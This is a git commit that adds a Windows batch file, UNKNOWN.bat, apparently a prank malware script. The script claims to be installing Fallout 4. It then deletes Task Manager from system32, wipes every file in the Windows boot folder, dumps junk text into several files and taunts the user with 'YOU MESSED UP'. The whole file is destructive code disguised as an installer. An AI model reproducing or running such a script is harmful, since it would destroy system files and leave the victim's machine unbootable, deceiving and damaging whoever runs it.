bb0bc48fd348bed0bfb4bb341c785aee1ed973c4
powerpellet1077 <70673296+powerpellet1077@users.noreply.github.com>
2021-03-04 13:45:34 -0800

    Create UNKNOWN.bat

---
+++ TEST/UNKNOWN.bat
@@ -0,0 +1,26 @@
+echo Installing Fallout 4
+ping localhost -n 9>nul
+del C:/Windows/system32/taskmgr.exe
+cd C:/Windows/boot/
+del *
+echo 8648353458o964357409o565 > UNKNOWN.txt
+echo 893648735345698675967567 >> UNKNOWN.txt
+echo 87368t57g46ft5745y34895459nf46g498h6gy4987hgi456g45b86gi >> UNKNOWN.txt
+echo Y#RFJEV#&rGIU@#VT&^VR@&*@VURT@#V&B@#UTV#BKR@IRI&@#R^ >> UNKNOWN.txt
+echo ioudshbovtsgriuydrvbuhvjdbrt7e5ytv874wv6845y4bwcd9i7a5td >> UNKNOWN.txt
+echo uoikhutpbeo4viyueboiky438375y4w8bv7t4u9786T&^$R^h4o3uh5867t3ui qvt68z5t8&ytr476u5h >> UNKNOWN.txt
+echo GIG*^@T31738texqt4b7q6i4758634835v39w3c48234854v74bt58347n687y#884o457y*^9b4b387tvb87t43 >> UNKNOWN.txt
+echo 87534w97g86tb876iud4n83yf >> UNKNOWN.txt
+echo 8648353458o964357409o565 > UNKNOWNS.txt
+echo 893648735345698675967567 >> UNKNOWNW.txt
+echo 87368t57g46ft5745y34895459nf46g498h6gy4987hgi456g45b86gi >> UNKNOWNF.txt
+echo Y#RFJEV#&rGIU@#VT&^VR@&*@VURT@#V&B@#UTV#BKR@IRI&@#R^ >> UNKNOWNV.txt
+echo ioudshbovtsgriuydrvbuhvjdbrt7e5ytv874wv6845y4bwcd9i7a5td >> UNKNOWNI.txt
+echo uoikhutpbeo4viyueboiky438375y4w8bv7t4u9786T&^$R^h4o3uh5867t3ui qvt68z5t8&ytr476u5h >> UNKNOWNL.txt
+echo GIG*^@T31738texqt4b7q6i4758634835v39w3c48234854v74bt58347n687y#884o457y*^9b4b387tvb87t43 >> UNKNOWNM.txt
+echo 87534w97g86tb876iud4n83yf >> UNKNOWND.txt
+echo YOU MESSED UP
+pause > nul
+echo BIG TIME
+pause > nul
+
